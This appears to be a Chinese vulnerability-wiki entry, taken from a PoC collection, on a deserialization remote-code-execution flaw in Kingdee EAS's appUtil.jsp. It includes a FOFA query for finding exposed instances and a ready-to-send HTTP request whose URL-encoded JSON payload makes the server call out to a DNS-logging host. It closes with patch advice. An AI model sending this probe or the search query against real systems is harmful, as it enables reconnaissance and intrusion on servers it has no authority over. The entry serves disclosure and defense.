---
fofa: "body="
source: "SourByte05/Vulnerability-Wiki-PoC"
---

# 金蝶 EAS 反序列化 RCE 漏洞 

# 漏洞描述

金蝶 EAS /easportal/tools/appUtil.jsp进行序列化与反序列化，在此过程中未对数据进行签名或校验，导致客户端发出的数据可被攻击者恶意篡改，写入包含恶意代码的序列化数据，达到在服务端远程命令执行的效果。

# 影响版本

金蝶 EAS

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 已公开 | 已知 |

## 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

# 漏洞复现

FOFA：body="easSessionId" || header="easportal"

POC/EXP：

GET /easportal/tools/appUtil.jsp?list=%7B%22x%22%3A%7B%22%40type%22%3A%22java.net.Inet4Address%22%2C%22val%22%3A%22ywyzxpum.eyes.sh%22%7D%7D HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

![image-20241010140700732](./.resource/金蝶EAS反序列化RCE漏洞/media/image-20241010140700732.png)


![image-20241010140800728](./.resource/金蝶EAS反序列化RCE漏洞/media/image-20241010140800728.png)


# 修复方案

临时缓解方案

限制访问来源地址，如非必要，不要将系统开放在互联网上。

升级修复方案

目前官方已发布安全补丁，建议受影响用户尽快升级至安全版本


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
